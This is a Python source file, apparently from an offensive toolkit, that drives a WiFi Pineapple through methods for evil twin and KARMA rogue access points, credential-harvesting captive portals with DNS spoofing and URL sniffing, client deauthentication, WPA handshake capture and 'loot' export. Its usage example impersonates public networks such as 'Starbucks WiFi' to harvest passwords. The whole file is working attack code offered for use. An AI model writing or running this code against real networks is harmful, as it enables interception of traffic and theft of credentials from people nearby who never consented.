"""
ERR0RS Pineapple Studio - Main Orchestrator
Natural language control of all Pineapple operations.
Ties together: connection, PineAP engine, recon, modules, and AI campaigns.
"""

from .pineapple_client import PineappleClient
from .pineap_engine import PineAPEngine
from .recon import PineappleRecon
from .modules_manager import ModulesManager
from pathlib import Path
import json

LOOT_DIR = Path(__file__).parent / "loot"


class PineappleStudio:
    """
    ERR0RS Pineapple Studio - One-stop WiFi Pineapple Nano control

    Usage:
        studio = PineappleStudio()
        studio.connect(password="yourpassword")
        studio.status()
        studio.quick_survey()
        studio.start_evil_twin_campaign(["Starbucks WiFi", "ATT_Guest"])
        studio.harvest_credentials()
    """

    def __init__(self, ip: str = "172.16.42.1", port: int = 1471,
                 password: str = None, token: str = None):
        self.client  = PineappleClient(ip, port, password, token)
        self.pineap  = PineAPEngine(self.client)
        self.recon   = PineappleRecon(self.client)
        self.modules = ModulesManager(self.client)
        LOOT_DIR.mkdir(parents=True, exist_ok=True)

    # ------------------------------------------------------------------ #
    #  CONNECTION                                                         #
    # ------------------------------------------------------------------ #

    def connect(self, password: str = None) -> dict:
        """Connect and authenticate to the WiFi Pineapple"""
        result = self.client.connect(password)
        if result.get("success"):
            info = self.client.system_info()
            result["device_info"] = info
        return result

    def disconnect(self) -> dict:
        return self.client.disconnect()

    def status(self) -> dict:
        """Full status: connection, PineAP state, resources"""
        connected = self.client.is_connected()
        if not connected:
            return {"connected": False, "message": "Not connected to Pineapple"}
        return {
            "connected": True,
            "system": self.client.system_info(),
            "resources": self.client.system_resources(),
            "pineap": self.pineap.get_settings(),
            "ssid_pool_count": len(self.pineap.get_ssid_pool()),
            "clients_connected": len(self.recon.get_clients()
                                     if isinstance(self.recon.get_clients(), list)
                                     else [])
        }

    # ------------------------------------------------------------------ #
    #  QUICK ACTIONS                                                      #
    # ------------------------------------------------------------------ #

    def quick_survey(self, interface: str = "wlan1") -> dict:
        """Run a site survey and return summary"""
        print("[ERR0RS] Running site survey...")
        return self.recon.site_survey_summary(interface)

    def quick_clients(self) -> list:
        """Get list of all currently connected clients"""
        return self.recon.get_clients()

    # ------------------------------------------------------------------ #
    #  CAMPAIGN WORKFLOWS                                                 #
    # ------------------------------------------------------------------ #

    def start_evil_twin_campaign(self, target_ssids: list[str] = None,
                                  allow_associations: bool = True) -> dict:
        """
        Launch a full evil twin / rogue AP campaign.
        1. Loads target SSIDs into PineAP pool (or uses existing pool)
        2. Enables beacon flood
        3. Allows client associations
        4. Starts logging probes and associations

        target_ssids: list of SSIDs to impersonate. If None, uses current pool.
        """
        print("[ERR0RS] Starting evil twin campaign...")
        steps = {}

        if target_ssids:
            steps["ssid_load"] = self.pineap.add_ssids_bulk(target_ssids)

        steps["pineap_enable"] = self.pineap.enable()
        steps["beacon_flood"]  = self.pineap.start_beacon_flood()
        steps["associations"]  = self.pineap.allow_associations(allow_associations)

        return {
            "campaign": "evil_twin",
            "status": "ACTIVE",
            "ssids_loaded": len(target_ssids) if target_ssids else "existing pool",
            "steps": steps
        }

    def start_karma_attack(self) -> dict:
        """
        Launch a KARMA attack.
        Pineapple responds to ALL probe requests, making itself appear
        as every AP every client has ever connected to.
        Maximally aggressive - catches every probing device nearby.
        """
        print("[ERR0RS] Starting KARMA attack - respond to all probes...")
        self.pineap.enable()
        return self.pineap.update_settings({
            "broadcastSSIDs": True,
            "captureSSIDs": True,
            "beaconResponsed": True,
            "allowAssociations": True,
            "logProbes": True,
            "logAssociations": True,
            "targetMAC": ""
        })

    def start_credential_harvest_campaign(self, portal_name: str = "default",
                                           ssids: list[str] = None) -> dict:
        """
        Full credential harvest campaign:
        1. Start evil twin with target SSIDs
        2. Enable Evil Portal captive portal
        3. DNS spoof all traffic to portal
        4. Start URL snarf for passive collection
        """
        print("[ERR0RS] Starting credential harvest campaign...")
        steps = {}
        steps["evil_twin"]   = self.start_evil_twin_campaign(ssids)
        steps["evil_portal"] = self.modules.evil_portal_start(portal_name)
        steps["dnsspoof"]    = self.modules.dnsspoof_redirect_all()
        steps["urlsnarf"]    = self.modules.urlsnarf_start()

        return {
            "campaign": "credential_harvest",
            "status": "ACTIVE",
            "portal": portal_name,
            "steps": steps
        }

    def stop_all_campaigns(self) -> dict:
        """Stop all active attack modules and PineAP"""
        print("[ERR0RS] Stopping all campaigns...")
        return {
            "pineap":     self.pineap.disable(),
            "evil_portal":self.modules.evil_portal_stop(),
            "dnsspoof":   self.modules.dnsspoof_stop(),
            "urlsnarf":   self.modules.urlsnarf_stop(),
        }

    # ------------------------------------------------------------------ #
    #  TARGETED ATTACKS                                                   #
    # ------------------------------------------------------------------ #

    def target_client(self, mac: str, bssid: str) -> dict:
        """
        Target a specific client:
        1. Deauth them from their current AP
        2. Set PineAP to respond to their probes
        Forces client to reconnect and (hopefully) associate with Pineapple.
        """
        print(f"[ERR0RS] Targeting client {mac}...")
        deauth  = self.recon.deauth_client(mac, bssid)
        target  = self.pineap.target_mac(mac)
        return {"deauth": deauth, "pineap_target": target}

    def capture_handshake(self, target_bssid: str,
                           deauth_clients: bool = True) -> dict:
        """
        Attempt to capture WPA handshake from target AP:
        1. Optionally deauth clients to force reconnect (triggers handshake)
        2. Start capture on monitor interface
        """
        steps = {}
        if deauth_clients:
            steps["deauth"] = self.recon.deauth_all(target_bssid)
        steps["capture"] = self.recon.start_handshake_capture(target_bssid)
        return {"target_bssid": target_bssid, "steps": steps}

    # ------------------------------------------------------------------ #
    #  LOOT COLLECTION                                                    #
    # ------------------------------------------------------------------ #

    def harvest_credentials(self) -> dict:
        """Collect all captured credentials from Evil Portal"""
        return self.modules.evil_portal_get_creds()

    def collect_all_loot(self) -> dict:
        """Export all loot: survey, clients, handshakes, credentials, URLs"""
        print("[ERR0RS] Collecting all loot...")
        recon_loot = self.recon.export_all_loot()
        creds      = self.modules.evil_portal_get_creds()
        urls       = self.modules.urlsnarf_get_log()
        hs_list    = self.recon.get_handshakes()

        summary = {
            "recon": recon_loot,
            "credentials_captured": len(creds) if isinstance(creds, list) else "?",
            "urls_captured": len(urls) if isinstance(urls, list) else "?",
            "handshakes_captured": len(hs_list) if isinstance(hs_list, list) else "?",
            "loot_dir": str(LOOT_DIR)
        }

        # Save full loot summary
        import json
        (LOOT_DIR / "loot_summary.json").write_text(json.dumps(summary, indent=2))
        return summary

    # ------------------------------------------------------------------ #
    #  PINEAP DIRECT ACCESS                                               #
    # ------------------------------------------------------------------ #

    def ssid_pool(self) -> list:
        return self.pineap.get_ssid_pool()

    def add_ssids(self, ssids: list[str]) -> dict:
        return self.pineap.add_ssids_bulk(ssids)

    def load_ssids_from_file(self, filepath: str) -> dict:
        return self.pineap.import_ssids_from_file(filepath)

    def clear_ssids(self) -> dict:
        return self.pineap.clear_ssid_pool()

    def probe_log(self) -> list:
        return self.pineap.get_probe_log()

    def association_log(self) -> list:
        return self.pineap.get_association_log()
